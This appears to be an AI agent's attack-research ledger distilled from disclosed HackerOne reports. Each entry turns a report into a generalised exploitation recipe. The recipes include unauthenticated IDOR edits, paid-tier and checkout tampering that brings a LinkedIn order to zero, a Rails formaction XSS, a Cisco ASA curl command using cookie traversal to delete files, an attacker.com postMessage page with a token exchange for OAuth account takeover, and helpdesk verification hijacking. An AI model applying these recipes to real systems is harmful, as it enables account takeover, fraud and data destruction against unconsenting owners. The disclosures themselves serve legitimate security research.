  6. ROOT CAUSE, verbatim: "The issue occurs because the application allows access to the edit page using only the payment identifier in the URL. The server does not verify whether the requester is logged in or has permission to modify the customer information linked to that payment."
DETECTION SIGNAL: a payment/customer record identified by a UUID in the URL path (`/payment/<uuid>/edit/`, `/billing/<uuid>`, `/customer/<uuid>/update`) whose edit page returns HTTP 200 with the form for a request carrying NO session cookie; a write endpoint whose only access-control input is the object identifier; a form that accepts a POST and returns a success/redirect with no 401/403; the object id is a UUID (not a sequential integer) yet the endpoint is reachable unauthenticated — the UUID is an identifier, not a capability.
CHAIN: any unauthenticated attacker -> the payment edit endpoint is reachable with only the payment UUID in the URL (primitive: no authentication, no ownership check) -> POST modified billing fields (escalation: a WRITE to another customer's payment record) -> the change persists in the application database (impact: integrity loss of payment-related customer data; the report frames possible disruption of billing/invoicing workflows; program rated High 7.5). Per doctrine §8: preconditions = the payment UUID (obtainable from any leak/receipt/URL) and no account; gain = persistent modification of another customer's billing name/address.
TRANSFERABLE TEST: for EVERY payment/billing/customer record endpoint whose path carries an object id (`/payment/<id>/edit/`, `/billing/<id>`, `/invoice/<id>`, `/customer/<id>/update`), (1) request the edit page with NO cookies and confirm it returns 200 + the form (not 401/403/302-to-login); (2) capture the form's POST and replay it with a modified field value; (3) re-read the record to confirm the change persisted. The tell is a 200 on an unauthenticated GET of a WRITE-form page — the id in the URL is the only "authorization". Rule: **an edit page reachable with only the object id and no session is an unauthenticated write primitive; the UUID is an identifier, not a capability.**
DEDUPE: 0 hits for `3869124`, `weblate`, `visionx7`, `IDOR_EVIDENCE_TEST`, `payment/01f82084`, `billing information` (as an unauthenticated IDOR). Pre-existing IDOR material REVIEWED as related-but-distinct: the ledger's `paymentId`/UUID probes (create/update endpoint UUID fields) test INJECTION into the id, not unauthenticated ACCESS to the record; the Subspace submission's `insert_superpay_payment_requests` is a PostgREST grant write, not a web-form IDOR; no entry records an unauthenticated payment-billing edit form keyed by UUID. No new §17 slot (the "unauthenticated IDOR on a write endpoint keyed by an id" class is broadly owned; this is the payment-billing carrier delta).

SOURCE: https://hackerone.com/reports/3370430  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 8,675 B, `visibility: full`, `vulnerability_information` 1,255 B read IN FULL (`curl` + desktop UA). Metadata: Lovable VDP, "Users can change project visibility which requires high subscription by just changing request body", weakness Improper Access Control - Generic, severity Medium (team-rated), submitted 2025-10-04, disclosed 2026-03-09, state Closed, reporter `hossam25` (verified).
STATUS: UNVERIFIED (not reproduced — no Lovable account/project was touched this pass; the endpoint, the JSON body and the response code are verbatim from the report body).
CLASS: client-side-only ENTITLEMENT / feature gate on a state-changing POST — a paid-tier restriction enforced only in the UI, not on the API (CWE-639 / CWE-863).
CORE METHOD:
  1. AUTHENTICATE as an ordinary free-tier user.
  2. CREATE a project (the report: "On Lovabl, write anything to build a project", then click create).
  3. INTERCEPT the create request with Burp — the endpoint is `https://lovable-api.com/workspaces/{YOUR-WORKSPACE-ID}/projects`.
  4. CHANGE the `visibility` value in the JSON body to a paid-tier value — the report's body: `{"description":"landing view","visibility":"Personal","initial_message":{"id":"umsg_01k6qkw83ze07t9f7m9p3jabs9","message":"landing view","files":[],"optimisticImageUrls":[],"chat_only":false,"agent_mode_enabled":false,"ai_message_id":"aimsg_01k6qkw841e07t9f7ytpghd6bs"}}` — where `visibility: "Personal"`/`"Workspace"` is the tier-gated value.
  5. SEND: "201 Created response and the project is now personal or workspace without any restrictions" (the report's attachment {F4856401}).
DETECTION SIGNAL: a POST whose JSON body carries a TIER/ENTITLEMENT field (`visibility`, `plan`, `tier`, `access`, `role`, `subscription`) whose restricted values are shown disabled/hidden in the UI; a state-changing API on a SEPARATE host from the web app (`lovable-api.com` vs the web app) so the web app's own role gate does not cover it; a 201/200 response whose body echoes the privileged value back.
CHAIN: any free-tier user (primitive: an ordinary account) -> the create/update endpoint accepts a caller-supplied entitlement field with no server-side tier check (primitive: the gate is UI-only) -> set `visibility` to the paid value (escalation: premium functionality granted) -> the project is persisted at the paid tier (impact: revenue loss / free use of premium features; program rated Medium). Per doctrine §8: preconditions = a free-tier account and a reachable API that accepts the entitlement field; gain = the paid-tier feature without payment.
TRANSFERABLE TEST: on any app with a tiered feature (project visibility, ad-free, workspace seats, API quota, export, custom domain), (1) capture the request that creates/updates the object and note any field whose value is disabled/absent in the UI for your tier; (2) set that field to the privileged value in the request body and replay; (3) confirm the privileged state is persisted (201/200 + the value echoed, and visible from a second session). The tell is a UI that hides the option while the API accepts it. Rule: **a feature gate enforced only by hiding/disabling a control in the UI is not a gate — replay the request with the privileged value and check whether the server persists it.**
DEDUPE: 0 hits for `3370430`, `hossam25`, `lovable-api.com/workspaces`, `visibility":"Personal"`. Pre-existing hits REVIEWED as related-but-distinct: the ledger's Lovable entry #3371448 (`tool-preferences`, `approval_preference`, Editor-JWT replay on a workspace AI setting) is a JWT-replay / role-check bug on a DIFFERENT route, not a caller-supplied entitlement field; §17.78 (Cloudflare Email Routing beta flag flipped by rewriting the API response) and Pixiv #3183520 (`/_api/update_user_setting` persists the premium ad-free setting) are the SAME client-side-only-feature-gate class — this is the DELTA that the gate protects a PROJECT-VISIBILITY entitlement set in the CREATE body (not a settings route), and the value is a tier name in the body, not a boolean flag. No new §17 slot (class owned by §17.78 / #3183520).

SOURCE: https://hackerone.com/reports/3008446  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 5,338 B, `visibility: no-content`, `vulnerability_information` 0 B (the report page does not render — the browser tool returns "Sorry, something went wrong"; `r.jina.ai` -> 401 IP-reputation; the Wayback `id_` captures -> archive.org bot-block; the ajaysenr mirror's `reports/3008446.md` states "No vulnerability information available."). The technique is carried by the PROGRAM'S OWN TEAM SUMMARY in the `.json` (`summaries[].content`) plus the CREDITED PUBLIC WRITEUP the maintainers point to: rails/rails-html-sanitizer GitHub issue #202 ("feature: sanitize the `formaction` attribute when allowlisted, like other URL attributes"), opened by @flavorjones 2025-04-09 — read in full via `web_extract`. Metadata: Ruby on Rails, "1-Click Cross-Site Scripting via Custom Configuration in SafeListSanitizer", weakness Cross-site Scripting (XSS) - Generic, severity Medium 6.1, submitted 2025-02-23, disclosed 2025-04-09, state Closed, resolution INFORMATIVE, reporter `maitaii` (not verified), asset https://github.com/rails/rails (SOURCE_CODE).
STATUS: UNVERIFIED (not reproduced — no Rails app was stood up this pass; the configuration and the missing scrub are verbatim from the team summary and the GitHub issue; the exact crafted input is NOT published in either source).
CLASS: sanitizer allow-list that includes a URL-BEARING ATTRIBUTE which the sanitizer does NOT scheme-scrub — `formaction` is allowlisted as an ordinary attribute, so a `javascript:` value survives into the rendered HTML (CWE-79 / CWE-1166).
CORE METHOD (verbatim from the team summary + GitHub issue #202):
  1. THE CONFIG: the application developer explicitly overrides the sanitizer allow-list to allow the default-blocked `form` and `button` tags AND the default-blocked `formaction` attribute (the issue: "When allowlisting the default-blocked `form` and `button` tags and the default-blocked `formaction` attribute, it's possible to inject scripting into the rendered HTML").
  2. THE GAP: `formaction` is a URL attribute (MDN `button#formaction`) but SafeListSanitizer does NOT scrub it the way it scrubs other URL attributes (`href`, `src`) — the maintainers' own framing: "it would be a good feature to scrub that attribute like we scrub other URL attributes", and the issue title asks to "sanitize the `formaction` attribute when allowlisted, like other URL attributes".
  3. THE RESULT: a `javascript:` (or other unsafe-scheme) value in `formaction` survives sanitization and is rendered into the page -> scripting executes on click (the report's "1-Click Cross-Site Scripting").
  4. THE MAINTAINERS' POSITION, verbatim: "We do not consider this to be a vulnerability, since: the application developer must explicitly change the sanitizer configuration to: allow multiple blocked tags (`form` and `button`) and allow a blocked attribute (`formaction`) ... it's not likely to be a common configuration."
DETECTION SIGNAL: an application whose HTML sanitizer is configured with a CUSTOM allow-list (Rails `config.action_view.sanitized_allowed_tags=`, `SafeListSanitizer.allowed_tags=`, or a per-call `tags:`/`attributes:` option) that includes a URL-bearing attribute — `formaction`, `action`, `xlink:href`, `ping`, `poster`, `background`, `cite`, `longdesc`, `usemap`, `data`, `srcset` — which is NOT in the sanitizer's own scheme-scrub list; a sanitizer that validates TAGS one-by-one and treats ATTRIBUTES as plain strings; a rendered page containing a `formaction`/`action` value with a `javascript:`/`data:` scheme.
CHAIN: an application that allowlists a URL-bearing attribute without scheme-scrubbing (primitive: the attribute is allowed as a plain string) -> an attacker submits content containing `<form><button formaction="javascript:…">` (or the equivalent for the allowed attribute) (escalation: the unsafe scheme survives sanitization) -> the content is rendered to other users and one click executes attacker JavaScript in the application's origin (impact: XSS with session impact; program rated Medium 6.1, resolution Informative because the configuration is opt-in). Per doctrine §8: preconditions = the app's sanitizer allow-list includes the URL attribute AND the attacker can submit content that is rendered to other users; gain = JavaScript execution in the victim's session on the app's origin.
TRANSFERABLE TEST: for any app whose sanitizer allow-list you can enumerate (error messages, `allowed_tags`/`allowed_attributes` config, a `sanitize()` call site, a client-side sanitizer config), list every URL-bearing attribute in the allow-list and, for each, submit a value with an unsafe scheme (`javascript:alert(1)`, `data:text/html,…`) and read the RENDERED HTML — if the scheme survives, you have an XSS primitive. Rule: **a sanitizer scrubs the URL attributes it KNOWS about (`href`, `src`) — enumerate the allow-list for URL-bearing attributes it does NOT know about (`formaction`, `action`, `ping`, `poster`, `xlink:href`) and test each for scheme survival; an allowlisted URL attribute that is not scheme-scrubbed is an XSS sink.**
DEDUPE: 0 hits for `3008446`, `maitaii`, `leonsirio`, `formaction` (as a sanitizer gap), `rails-html-sanitizer/issues/202`. Pre-existing SafeListSanitizer material REVIEWED as related-but-distinct: the ledger records the TAG-COMBINATION bypasses — #1805873 (svg+style), #1805899 (math+style || svg+style), #1599573 (style), #1805893 (select+style, CVE-2022-23520) — and their DETECTION SIGNAL flags "any `data:`/`blob:`-URL attribute" as dangerous; NONE records the ATTRIBUTE-LEVEL gap that `formaction` is allowlisted but NOT scheme-scrubbed (the maintainers' own issue #202 asks for exactly that scrub). No new §17 slot (the SafeListSanitizer class is owned; this is the URL-attribute-not-scrubbed delta).

NOTE — reader pass 2026-11-10 (batch 119: 6 assigned sources read ONE BY ONE in the given order; 4 entries appended to the harvest ledger, 0 §17 slots). DELTAS (no §17 slot): #271324 (HackerOne — a signed redirect URL whose signature is computed over the PUNYCODE-normalized `url` parameter, so re-submitting the raw IDN (and/or an extra `//` after `https:`) passes the signature while the warning interstitial displays a different host than the browser navigates to; class owned by §17.250/§17.252), #3869124 (Weblate — an UNAUTHENTICATED IDOR on a payment billing edit endpoint keyed only by the payment UUID in the URL, `/en/payment/<uuid>/edit/`, accepting a POST that persistently modifies another customer's billing name/address; High 7.5), #3370430 (Lovable VDP — a client-side-only ENTITLEMENT gate: the create-project POST body's `visibility` field is set to the paid-tier value `Personal`/`Workspace` and the server persists it with no subscription check; class owned by §17.78 / Pixiv #3183520), #3008446 (Ruby on Rails — SafeListSanitizer allow-lists the URL-bearing `formaction` attribute without scheme-scrubbing it (unlike `href`/`src`), so a `javascript:` value survives -> 1-click XSS; the report is `no-content` and INFORMATIVE, so the technique is carried by the program's own team summary + the credited public writeup rails/rails-html-sanitizer issue #202). SOURCE: https://hackerone.com/reports/2131224  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 5,519 B, `visibility: no-content`, `vulnerability_information` 0 B (the report body is empty; the researcher's own summary field carries only the writeup URL). The technique is carried by the CREDITED PUBLIC WRITEUP the researcher points to — `aidilarf.medium.com` "[PART 2] Anyone can use unlimited Trial Premium on accounts that have used Trial Premium before" (published 2025-02-07) — read IN FULL this pass via the Wayback capture `web.archive.org/web/20250520062247/...` in the browser tool (the live Medium page is behind a Cloudflare "Just a moment..." check; `web_extract` returned a truncated stub; `r.jina.ai` -> 401 IP-reputation). Metadata: LinkedIn, "Attackers can *Upgrade and claim offer* on the Premium Trial Subscription with a total price of *IDR0.00* from the original *IDR7,022,061.82*", weakness Business Logic Errors, severity High, submitted 2023-09-01, disclosed 2024-06-18, state Closed, reporter `find_me_here`, asset www.linkedin.com; the writeup's own timeline records a $2,500 bounty.
STATUS: UNVERIFIED (not reproduced — no LinkedIn account was touched this pass; the endpoint, the JSON body and the two bypasses are verbatim from the writeup).
CLASS: business-logic / pricing — the order total is computed from the SUPPLIED parameter set, so OMITTING the parameters that describe the CURRENT paid state makes the server re-price the order as a fresh promotional purchase (CWE-840 / CWE-639).
CORE METHOD:
  1. AUTHENTICATE as a user with an ACTIVE/EXPIRED Premium subscription (the writeup: "In this article, we use an account with a Premium Subscription").
  2. OPEN the "Upgrade and Claim Offer" page (`https://www.linkedin.com/premium/switcher/?upsellOrderOrigin=premium_nav_more_products_panel&utype=sales`) and capture the checkout request with Burp: `POST /voyager/api/voyagerPremiumDashSubscriptionCheckoutInformation?action=requestCheckoutV2` with the JSON body `{"productUrn":"urn:li:premiumProduct:112000","mainPriceId":6455991,"optionalPriceIds":[6455401],"promotionId":65580503,"upsellOrderOrigin":"premium_nav_more_products_panel","serviceIdSwitchingFrom":353397456}`.
  3. BASELINE: with the unmodified body the order total is `IDR7,022,061.82`.
  4. BYPASS 1 — DELETE ONE PARAMETER: remove `serviceIdSwitchingFrom` from the JSON body and re-send. Result, verbatim: "And the result is that we get a total order of IDR 0.00".
  5. BYPASS 2 (after the first was fixed) — DELETE TWO PARAMETERS: remove BOTH `optionalPriceIds` and `serviceIdSwitchingFrom` and re-send. Result, verbatim: "And we get a total order of IDR 0.00 back. Then we pay and complete the order as the LinkedIn team requested."
  6. THE PARAMETERS' ROLES, verbatim from the writeup: `productUrn` "is used to detect the Premium product you want to use"; `mainPriceId` & `optionalPriceIds` "determines the price of a product you want to buy"; `promotionId` "is used to determine a promotion for a product"; `serviceIdSwitchingFrom` "is the serviceId that is currently in use".
DETECTION SIGNAL: a checkout / quote / upgrade / trial-claim request whose body carries STATE identifiers of the CURRENT subscription/plan (`serviceIdSwitchingFrom`, `currentPlanId`, `subscription_id`, `switchingFrom`, `sourceServiceId`) alongside PRICE/PROMOTION identifiers (`mainPriceId`, `optionalPriceIds`, `promotionId`, `couponId`); a total that is computed server-side from the SUPPLIED set (the writeup's own tell: "Look, there's something strange about that request"); a request where DELETING a parameter changes the computed total instead of erroring.
CHAIN: an authenticated user with an active/expired paid subscription (primitive: an ordinary account) -> the checkout endpoint recomputes the total from the supplied parameter set, with no server-side re-derivation of the current state (primitive: the state parameters are INPUTS, not assertions) -> delete `serviceIdSwitchingFrom` (escalation: the server no longer sees an "upgrade-from" state and re-prices the order as a fresh promotional purchase) -> the total becomes IDR 0.00 and the order can be completed (impact: free premium subscription / monetary loss at scale; program rated High; $2,500 bounty). Per doctrine §8: preconditions = an account with a current/former Premium subscription and a reachable checkout endpoint; gain = a paid premium subscription for IDR 0.00.
TRANSFERABLE TEST: on any checkout / quote / upgrade / trial-claim request, capture the full JSON body and (1) record the baseline total; (2) DELETE each parameter ONE AT A TIME — especially state identifiers naming the current plan/subscription/service and any price/option arrays — and re-send, diffing the computed total each time; (3) then try PAIRS of deletions. A parameter whose removal silently LOWERS the total (rather than 400ing) is the bug. Rule: **the server computes the order total from the SUPPLIED parameter set — a state parameter that describes the current paid subscription is an INPUT, not an assertion, so deleting it (and the price-option array with it) re-prices the order as a fresh promotional purchase.**
DEDUPE: 0 hits for `2131224`, `requestCheckoutV2`, `voyagerPremium`, `serviceIdSwitchingFrom`, `optionalPriceIds`, `promotionId`, `premiumProduct`, `IDR0`. Pre-existing business-logic material REVIEWED as related-but-distinct: the playbook's V-01 (price/quantity/currency VALUE tampering — `unit_price=0.01`, `discount=100`, `total=0.01`) tampers with money FIELDS and never REMOVES a state parameter; the ledger's signed-request boundary-shift entry (the `CustomerEmail=brixamount100abc@host` primitive) re-splits a SIGNED string to inject a field, a different primitive; the ledger's one-time-benefit entries are additive claim endpoints, not a checkout re-price. New general method -> §17.360.

SOURCE: https://hackerone.com/reports/960330  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 5,276 B, `visibility: full`, `vulnerability_information` 2,239 B read IN FULL (`curl` + desktop UA). Metadata: U.S. Dept of Defense, "CVE-2020-3187 - Unauthenticated Arbitrary File Deletion", weakness Path Traversal, severity Critical (CVSS 3.0 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`, Base 9.1), submitted 2020-08-17, disclosed 2020-09-21, state Closed, reporter `oucast__`.
STATUS: UNVERIFIED (not reproduced — no Cisco ASA/FTD device was touched this pass; the endpoint, the cookie and the file path are verbatim from the report body).
CLASS: unauthenticated path traversal in a COOKIE/HEADER value that is used as a FILESYSTEM PATH — the WebVPN `token` cookie is concatenated into the web-services file path, so `../` in it escapes the webroot (CWE-22).
CORE METHOD:
  1. FINGERPRINT the WebVPN portal: `curl -k -s -i https://<target>/+CSCOE+/session_password.html` -> HTTP 200 (the report's step 1: "First I performed a curl request to validate that /session_password.html gave a 200 response").
  2. THE VULNERABLE REQUEST — the traversal rides in the `Cookie` header, not the URL: `curl -k -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://<target>/+CSCOE+/session_password.html`.
  3. THE EFFECT: the server resolves the `token` cookie value as a path inside the web-services filesystem and DELETES the named file — the report's example removes `/+CSCOU+/csco_logo.gif` ("Example to delete logo file").
  4. SCOPE, verbatim: "The attacker can only view and delete files within the web services file system. This file system is enabled when the affected device is configured with either WebVPN or AnyConnect features. This vulnerability can not be used to obtain access to ASA or FTD system files or underlying operating system (OS) files. Reloading the affected device will restore all files within the web services file system."
  5. SAFE-TO-TEST NOTE, verbatim: "No destructive behavior was performed on target, the above command will remove `csco_logo.gif` and can be restored on reboot of the device".
  6. The `+CSCOE+/` and `+CSCOU+/` prefixes are the WebVPN URL root / content root — the traversal target is named relative to that root.
DETECTION SIGNAL: an unauthenticated endpoint on a VPN/SSL-VPN/appliance web portal (Cisco ASA/FTD WebVPN, AnyConnect, `+CSCOE+/…`, `/dana/…`, `/sslvpn/…`) that accepts a cookie or header whose value is used as a path; a `token`/`session`/`SID` cookie that is NOT an opaque session id but a PATH component; a 200 on a request carrying `../` in a cookie/header where the same `../` in the URL is normalised; a known webroot file that disappears (or whose content is returned) after the request.
CHAIN: any unauthenticated attacker on the internet (primitive: the WebVPN portal is reachable with no auth) -> the `token` cookie value is used as a filesystem path with no traversal validation (primitive: a header/cookie is a path sink) -> `Cookie: token=../+CSCOU+/csco_logo.gif` makes the server read/delete an arbitrary file in the web-services webroot (escalation: unauthenticated arbitrary file read + delete, C:H/I:H) -> the webroot holds the portal's pages, uploaded/logo content and WebVPN session/config artefacts, so reading them exposes portal internals and deleting them disrupts the VPN login page until reload (impact: unauthenticated critical integrity/confidentiality loss on the perimeter VPN; program rated Critical 9.1). Per doctrine §8: preconditions = reachability of the WebVPN portal (no auth, no user interaction); gain = read + delete of any file inside the web-services filesystem.
TRANSFERABLE TEST: for EVERY unauthenticated request, inject traversal sequences into each COOKIE and each HEADER value (not just the query/body) — `Cookie: token=../<known-webroot-file>`, `token=../../<file>`, `X-Forwarded-For: ../<file>`, `User-Agent: ../<file>` — and observe whether a known file's content comes back or a known file disappears; run the control with the same `../` in the URL to confirm the URL path is normalised while the cookie/header is not. Rule: **a cookie or header value that is concatenated into a filesystem path is a traversal sink — the cookie is not always an opaque session id; on WebVPN-style portals the `token` cookie IS the path, so `Cookie: token=../<file>` is unauthenticated arbitrary file read/delete.**
DEDUPE: 0 hits for `960330`, `CVE-2020-3187`, `CSCOE`, `session_password`, `webvpn`, `Cisco ASA`, `token=../`, `arbitrary file deletion`. Pre-existing material REVIEWED as related-but-distinct: the playbook's V-12 step 3 already records the GENERAL placement bypass ("try the same encoded traversal in under-inspected containers — multipart filenames, JSON bodies, `X-Original-URL`/`X-Rewrite-URL`/`X-Forwarded-Path` headers, or cookies"), and the ledger's Pulse Secure entry (#510152) is a URL-PATH traversal (`/dana-na/../dana/html5acc/guacamole/…`) on a different appliance — neither records the SPECIFIC gadget here: an unauthenticated WebVPN endpoint where the COOKIE VALUE ITSELF is the filesystem path. No new §17 slot (the general placement method is owned by V-12; this is the carrier delta).

NOTE — reader pass 2026-11-10 (batch 120: 6 assigned sources read ONE BY ONE in the given order; 2 entries appended to the harvest ledger, 1 §17 slot). NEW: #2131224 (LinkedIn — a checkout request whose total is computed from the SUPPLIED parameter set is re-priced by DELETING the state parameters that describe the current paid subscription: removing `serviceIdSwitchingFrom` (and later `optionalPriceIds` too) makes the server treat the order as a fresh promotional purchase -> total IDR 0.00; the report is `no-content`, so the technique is carried by the researcher's credited Medium writeup, read in full via the Wayback capture -> §17.360), #960330 (U.S. DoD / Cisco ASA — CVE-2020-3187: the WebVPN `token` COOKIE value is used as a filesystem path, so `Cookie: token=../+CSCOU+/csco_logo.gif` on the unauthenticated `/+CSCOE+/session_password.html` reads/deletes arbitrary files in the web-services webroot; Critical 9.1; carrier delta of the V-12 placement method). DUPLICATE (valid, read, nothing new): #756149 (Nord Security — blind SSRF via a self-hosted Sentry's source-code-scraping fetching the `filename`/`request.url` from an unauthenticated `POST /api/4/store/`; the same method is already recorded from HackerOne #374737, which the Nord report itself cites as supporting material). VALID-BUT-CHAIN-PRIMITIVE-ONLY (reflected-param, no documented chain — not appended): #2039384 (MTN Group — reflected XSS in `https://nin.mtn.ng/nin/success?message=lol&nin=<script>alert(1)</script>`), #714521 (Stripo — reflected XSS in the URL-path slug `https://stripo.email//templates/<slug>%3E%22%27%3E%3Cscript%3Ealert(1578%29%3C%2Fscript%3E`). INVALID: #2469713 (GitHub — "View private repository NWO of deploy key via internal LFS API", `visibility: no-content`, 0 B body; the live `.json`, the ajaysenr mirror and the Wayback meta description carry only the program's own summary "enumerate the names of private repositories that utilize deploy keys"; CVE-2024-6395's public record adds no endpoint, no parameter, no request shape -> teaches nothing concrete). 0 fabricated. Knowledge intake only — no target was touched; the only network traffic was `curl`/`web_extract`/`web_search` against hackerone.com report routes, the Wayback availability+page endpoints, r.jina.ai, the ajaysenr mirror, the credited Medium writeup, and a CVE search.

SOURCE: https://hackerone.com/reports/314814  2026-11-10
ROUTE: live `.json` route -> HTTP 200, 8,643 B, `visibility: full`, `vulnerability_information` 3,036 B read IN FULL (`curl` + desktop UA).
STATUS: UNVERIFIED (not reproduced — no Semrush/SEOquake OAuth app was driven this pass; the authorize URL, the success-page script, the token-exchange POST and the response are verbatim from the report body).
CLASS: OAuth authorization-code theft via an ORIGIN-UNCHECKED `window.opener.postMessage` on the provider's SUCCESS page — any site that opens the authorize URL in a popup receives the callback URL (which carries `?code=`) in a `message` event, and the code is exchanged for access + refresh tokens (CWE-345 / CWE-926; ATO chain).
CORE METHOD:
  1. THE VULNERABLE SCRIPT on the OAuth success page (`https://oauth.semrush.com/oauth2/success`), verbatim:
     `<script> if (window.opener && typeof opener.postMessage === 'function') { opener.postMessage({ type: 'semrush:oauth:success', url: location.href }, '*'); } </script>`
     — it posts the FULL success URL (which contains the `code` query parameter) to whatever window opened it, with `targetOrigin: '*'`.
  2. THE ATTACKER PAGE, verbatim from the report:
     `<script> function listener(event) { alert(JSON.stringify(event.data)); } var dest = window.open("https://oauth.semrush.com/oauth2/authorize?response_type=code&scope=user.info,projects.info,siteaudit.info&client_id=seoquake&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess&state=636e7bae-22ed-407d-8d62-1d49b49ec962"); window.addEventListener("message", listener); </script>`
     hosted at `attacker.com/postmessage.html`.
  3. The victim must be logged in at `www.semrush.com` and click "Approve" on the SEOquake consent screen (the report notes the user believes it is an official Semrush app permission request).
  4. The attacker's page receives `{type:'semrush:oauth:success', url:'https://oauth.semrush.com/oauth2/success?code=…&state=…'}` and reads the `code` out of `url`.
  5. EXCHANGE THE CODE for tokens — verbatim request: `POST /oauth2/access_token HTTP/1.1` / `Host: oauth.semrush.com` / `Content-type: application/x-www-form-urlencoded` / body `client_id=seoquake&client_secret=<APP_SECRET>&grant_type=authorization_code&code=<CODE>&redirect_uri=https%3A%2F%2Foauth.semrush.com%2Foauth2%2Fsuccess`
  6. The response, verbatim shape: `{"access_token":"…","token_type":"Bearer","expires_in":604800,"refresh_token":"…"}` — the victim's access AND refresh tokens.
DETECTION SIGNAL: an OAuth/OIDC provider's SUCCESS/CALLBACK page that calls `window.opener.postMessage(...)` (or `parent.postMessage`) with `targetOrigin` `'*'` and includes the callback URL / `code` / `state` / tokens in the payload; an authorize URL that opens in a popup/window (so an attacker page can be the opener); a consent screen whose app name the attacker can make look official; no `event.origin` check on the receiving side.
CHAIN: any attacker page (primitive: any origin can open a popup) -> the victim is logged into the provider and approves a consent screen (primitive: one click on a plausible app name) -> the provider's success page posts the callback URL carrying the authorization `code` to `window.opener` with `'*'` (escalation: the code is delivered cross-origin to the attacker's page) -> the attacker exchanges the code at `/oauth2/access_token` with the app's own `client_id`/`client_secret` (escalation: code -> access + refresh tokens) -> full account takeover of the victim's account at the provider, plus the app's scopes (`user.info`, `projects.info`, `siteaudit.info`). Per doctrine §8: preconditions = the victim is logged into the OAuth provider and approves the consent screen (user interaction: one click; the attacker needs a registered OAuth client — `seoquake` here — or any client whose authorize URL they can craft); gain = the victim's access + refresh tokens = ATO.
TRANSFERABLE TEST: for EVERY OAuth/OIDC authorize flow that opens in a popup or new window, (1) open the authorize URL from a page you control (`window.open(...)`) with a `message` listener attached; (2) approve the consent as a logged-in test user; (3) inspect the received `event.data` — if it carries the callback URL, the `code`, the `state` or a token, the flow leaks the code cross-origin; (4) exchange the captured `code` at the token endpoint to prove ATO. Also test the reverse: a success page that uses `postMessage` to a FIXED origin but with a `code` in the URL is only a bug if the opener can be attacker-controlled (popup flows) — a top-navigation callback is not. Rule: **an OAuth success/callback page that `postMessage`s its own URL (or the code) to `window.opener`/`parent` with `targetOrigin '*'` is a code-theft primitive — open the authorize URL in a popup from your own page and read the message.**
DEDUPE: 0 hits for `314814`, `oauth2/success`, `opener.postMessage`, `seoquake`, `oauth2/access_token`, `semrush:oauth:success`. Pre-existing postMessage material REVIEWED as related-but-distinct: §17.147 / #231053 (the listener's escape loop skips non-own properties), §17.165 / #603764 (an origin gate written as a substring test), §17.286 / #1081167 (an origin-unchecked postMessage into a third-party SDK's command queue) — all three are about a listener that RECEIVES a message and then injects/evals it; NONE records the OAuth SUCCESS page as the SENDER that hands the authorization code to its opener. Pre-existing OAuth material REVIEWED as related-but-distinct: §17.195 / #1861974 (a `redirect_uri` allowlist that path-prefix-matches without normalising dot-segments, so the code lands on an attacker page on the SAME host — a redirect allowlist bug, not a postMessage leak), §17.126 / #294911 (an OAuth login that mints a valid session on a failed exchange), the Snapchat SSO `ticket` entry (a fragment carried across a permissive `referrer` allowlist). New general method -> §17.361.

SOURCE: https://hackerone.com/reports/235139  2026-11-10
ROUTE: live `.json` -> HTTP 404; `web_extract` -> backend timeout; the browser tool -> Cloudflare "Just a moment..."; `r.jina.ai` -> 401 IP-reputation. READ via the Wayback `.json` capture `web.archive.org/web/20251020050308id_/https://hackerone.com/reports/235139.json` in the browser tool -> HTTP 200, 5,106 B, `visibility: no-content`, `vulnerability_information` 0 B; the researcher's own summary field carries the credited writeup URL. The technique is carried by the CREDITED PUBLIC WRITEUP — Inti De Ceukelaire, "How I hacked hundreds of companies through their helpdesk" (`medium.com/@intideceukelaire/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c`), read IN FULL this pass via the Wayback capture `web.archive.org/web/20170921181142/...` (the live Medium page is behind a Cloudflare "Just a moment..." check; `curl` -> 403).
STATUS: UNVERIFIED (not reproduced — no support desk was touched this pass; the Vimeo/Zendesk/Kayako steps and the blog's own report are verbatim from the writeup).
CLASS: authentication bypass / account-takeover chain by registration on a company's SUPPORT DESK with an UNVERIFIED e-mail address — the support portal creates a ticket for that address, the attacker reads the ticket, and the ticket contains the magic verification links that address receives -> join the company's Slack/Yammer/Twitter (CWE-345 / CWE-639 / CWE-287; ATO chain).
CORE METHOD (the "Ticket Trick", per the writeup):
  1. THE PRECONDITION: popular business-communication tools let anyone with a matching `@company` e-mail join the company's instance — the writeup, verbatim: "Slack: Users with the same @company mail can join the team by default, this can be replaced by SSO or set to invite-only. Yammer: everyone with an @company mail can join. Facebook Workplace: everyone with an @company mail can join."
  2. THE KEY — a SUPPORT DESK that accepts e-mail-created tickets (Zendesk, Kayako, (Fresh)Desk, WHMCS, or a custom tool): "E-mails sent to support@company.com sometimes turned up in an online support portal such as Zendesk, Kayako, (Fresh)Desk, WHMCS or a custom tool."
  3. THE ENTRY POINT: "More than half of the websites I tested did not require e-mail verification, which means any one could sign up with any e-mail address and effectively read any support tickets created by that e-mail address."
  4. THE WORKED EXAMPLE (Vimeo), verbatim shape: register a Vimeo account with the SAME e-mail address Slack uses to send its magic verification links — `feedback@slack.com`; then use Slack's "find your workspace" feature to find Vimeo's Slack instance and sign up with `support@vimeo.com`. "Behind the scenes, feedback@slack.com now sends an e-mail to support@vimeo.com containing the verification link. When support@vimeo.com receives the e-mail, it will be classified as a support ticket created by feedback@slack.com… which is the exact e-mail I signed up with." -> open the help center -> "I had one open support ticket… which contained the magic verification link I needed to join the Vimeo team."
  5. THE ZENDESK/KAYAKO BYPASS (the report's own subject, #235139): "I found two additional flaws, in Kayako and Zendesk, that allowed me to bypass the e-mail verification process in their common setups. This allowed me to always execute the attack even when SSO was not enabled and e-mail verification was required." (The writeup does not publish the technical detail of the Zendesk SSO bypass; the report body is `no-content`.)
  6. THE SECOND-ORDER VARIANT: "websites that require users to verify their e-mail address upon registration, but not when changing it afterwards are vulnerable as well."
